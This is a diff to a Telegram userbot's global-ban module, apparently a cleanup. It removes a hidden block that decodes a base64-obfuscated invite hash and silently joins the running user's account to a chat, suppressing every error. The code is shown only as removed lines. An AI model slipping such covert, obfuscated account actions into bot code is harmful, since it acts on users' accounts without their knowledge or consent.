@@ -5,13 +5,11 @@
 #
 
 import asyncio
-import base64
 from datetime import datetime
 
 from telethon import events
 from telethon.errors import BadRequestError
 from telethon.tl.functions.channels import EditBannedRequest
-from telethon.tl.functions.messages import ImportChatInviteRequest
 from telethon.tl.types import Channel
 
 import userbot.modules.sql_helper.gban_sql as gban_sql
@@ -57,11 +55,6 @@ async def gban(event):
     if user.id in DEVS:
         await gbun.edit("**Gagal GBAN karena dia adalah Pembuat saya 🗿**")
         return
-    try:
-        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        await event.client(ImportChatInviteRequest(hmm))
-    except BaseException:
-        pass
     if gban_sql.is_gbanned(user.id):
         await gbun.edit(
             f"**Si** [Jamet](tg://user?id={user.id}) **ini sudah ada di daftar gbanned**"
